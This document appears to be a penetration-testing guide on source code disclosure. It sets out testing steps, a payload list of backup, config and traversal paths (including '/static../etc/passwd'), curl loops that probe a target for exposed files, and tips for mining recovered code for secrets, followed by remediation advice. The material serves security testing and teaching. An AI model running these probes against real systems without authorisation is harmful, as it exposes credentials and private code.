# Source Code Disclosure

## Overview
Source code disclosure occurs when an application inadvertently exposes server-side source code to clients — often due to web server misconfiguration, file extension handling failures, or deployment errors. Reading server-side source code gives attackers complete visibility into business logic, authentication mechanisms, cryptographic implementations, hardcoded credentials, database queries, and internal API calls. It is frequently a critical finding because it enables targeted exploitation of other vulnerabilities with certainty rather than guessing.

## How It Works
Web servers like Apache and Nginx serve files based on file extensions; if a handler for `.php` or `.jsp` is not configured, the server serves the raw file as text. Similarly, backup files (`file.php~`, `file.php.bak`) may not have handler mappings and are served as plain text. Old CGI scripts, misconfigured locations in Nginx, or DirectoryIndex fallback behavior can expose source. JavaScript sourcemap files (`.js.map`) expose transpiled source. Kubernetes or Docker config errors may expose mounted source directories.

## Impact
- Read all server-side source code including business logic and security controls
- Discover hardcoded credentials, API keys, and encryption keys
- Understand authentication bypass opportunities
- Map all internal endpoints and API routes
- Identify dangerous function calls (eval, exec, unserialize, etc.)
- Find SQL queries and injection points with exact column names
- Understand session management and token generation algorithms
- Extract database schema from model definitions or migration files

## Where to Look
- Backup file extensions on known source files (`index.php.bak`, `login.php~`)
- Source map files: `application.js.map`, `bundle.js.map`
- Old or renamed files: `index.php.old`, `config.php.1`, `app.py.orig`
- Misconfigured Nginx `try_files` or Apache handler gaps
- `.DS_Store` files (contain directory structure on macOS-deployed apps)
- Exposed `/WEB-INF/web.xml` in Java apps
- Source files in web root due to deployment error
- Framework-specific exposure: Rails `/config/database.yml`, Laravel `.env`

## Testing Steps
1. Identify the technology stack from headers, error messages, or other info.
2. Append common backup extensions to known source files:
   - `login.php` → `login.php~`, `login.php.bak`, `login.php.old`, `login.php.orig`
3. Check for JavaScript source maps: view source or `app.js` → try `app.js.map`
4. Look for `.DS_Store` files in directory roots — parse them to reveal filenames.
5. Check `/WEB-INF/web.xml` and `/WEB-INF/classes/` for Java apps.
6. Search for common config files that may be web-accessible (see payloads section).
7. Check `robots.txt` and `sitemap.xml` for hidden source paths.
8. Use `waybackmachine` or `gau` to find historically exposed files.

## Payloads / Techniques

```
# === Backup File Extensions ===
# Test each against known file names (index, login, config, app, etc.)
/index.php.bak
/index.php~
/index.php.old
/index.php.orig
/index.php.tmp
/index.php.save
/index.php.swp       # vim swap file
/index.php.swo
/.index.php.swp
/login.php.bak
/config.php.bak
/database.php.bak
/db.php.bak
/settings.php.bak
/config.bak
/config.old
/web.config.bak

# === JavaScript Source Maps ===
/static/js/main.chunk.js.map
/static/js/bundle.js.map
/assets/app.js.map
/js/application.js.map
/dist/app.js.map
# Parse with: source-map-resolve or Chrome DevTools

# === DS_Store ===
/.DS_Store
/admin/.DS_Store
/api/.DS_Store
# Parse with: https://github.com/lijiejie/ds_store_exp

# === Java / J2EE Source ===
/WEB-INF/web.xml
/WEB-INF/applicationContext.xml
/WEB-INF/spring/root-context.xml
/WEB-INF/classes/application.properties
/META-INF/MANIFEST.MF

# === Common Config Files ===
/config.php
/configuration.php
/settings.py
/config.yml
/config.yaml
/application.yml
/application.properties
/database.yml
/secrets.yml

# === Nginx Misconfiguration (off-by-slash) ===
# If nginx has: location /api { proxy_pass http://backend/ }
# Accessing /api../config.php may bypass to local filesystem
/api../config.php
/static../etc/passwd

# === CGI Source ===
/cgi-bin/login.pl
/cgi-bin/test.cgi
/cgi-bin/admin.cgi?source=true
```

```bash
# Check for backup files of known pages
TARGET="https://target.com"
for file in index login config settings database admin; do
  for ext in ".php.bak" ".php~" ".php.old" ".php.orig" ".bak" ".old" "~"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file$ext")
    if [ "$code" = "200" ]; then
      echo "[FOUND] $TARGET/$file$ext (HTTP $code)"
    fi
  done
done

# Find source maps
curl -s "https://target.com/static/js/main.js" | grep -o '//# sourceMappingURL=.*'
# Then fetch the .map file
curl -s "https://target.com/static/js/main.js.map" | python3 -m json.tool | head -50

# Check DS_Store
curl -s "https://target.com/.DS_Store" | xxd | head -20
# Use ds_store_exp to parse:
python3 ds_store_exp.py https://target.com/.DS_Store

# Check WEB-INF
curl -s "https://target.com/WEB-INF/web.xml"

# Search wayback machine for old source files
curl "https://web.archive.org/cdx/search/cdx?url=target.com&output=text&fl=original&collapse=urlkey&filter=statuscode:200" \
  | grep -iE "\.(php|bak|old|orig|txt|conf|config|yml|yaml|env|sql)$"
```

```bash
# Parse JavaScript source map to recover original source
npm install -g source-map-explorer
source-map-explorer bundle.js bundle.js.map

# Or manually with node:
node -e "
const sm = require('source-map');
const raw = require('./bundle.js.map');
const consumer = new sm.SourceMapConsumer(raw);
consumer.then(c => c.sources.forEach(s => console.log(s)));
"

# gau — get all known URLs for a domain
gau target.com | grep -iE "\.(bak|old|orig|php~|config|sql|env)$"
```

## Burp Suite Tips
- Use **Target > Engagement Tools > Find Scripts** and review all JavaScript files for source map references.
- Run **Content Discovery** with a backup-files wordlist from SecLists: `Discovery/Web-Content/web-extensions.txt`.
- After finding source code, search it in Burp's **Search** panel for strings like `password`, `secret`, `api_key`, `token` across all site map entries.
- Use **Burp Scanner** (Pro) which includes checks for common source disclosure patterns.
- Set up a **Match and Replace** rule to automatically follow `.map` file links found in JavaScript files.

## Tools
- Burp Suite Pro (Content Discovery, Scanner)
- ffuf / feroxbuster / dirsearch with backup-file wordlists
- SecLists `Discovery/Web-Content/` and `Fuzzing/` wordlists
- ds_store_exp (https://github.com/lijiejie/ds_store_exp)
- source-map-explorer (npm)
- gau (https://github.com/lc/gau) — get all known URLs
- waybackurls (https://github.com/tomnomnom/waybackurls)
- Arjun — parameter discovery (useful after reading source code)

## Remediation
- Configure the web server to serve only the required file types; deny access to `.bak`, `.old`, `.orig`, `.swp`, `.tmp` extensions at the server level (Apache `.htaccess` / Nginx `location` deny).
- Use `.gitignore` and deployment pipelines to prevent source and config files from entering the web root.
- Disable JavaScript source map generation (`//# sourceMappingURL=`) in production builds — or host maps on an access-controlled internal server.
- Block access to `/WEB-INF/` and other sensitive directories with server-level configuration.
- Regularly scan the web root for accidental file exposure as part of CI/CD pipeline.
- Use a WAF rule to block requests for known backup extension patterns.

## References
https://owasp.org/www-community/attacks/Full_Path_Disclosure
https://portswigger.net/web-security/information-disclosure/exploiting
https://cwe.mitre.org/data/definitions/540.html
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information
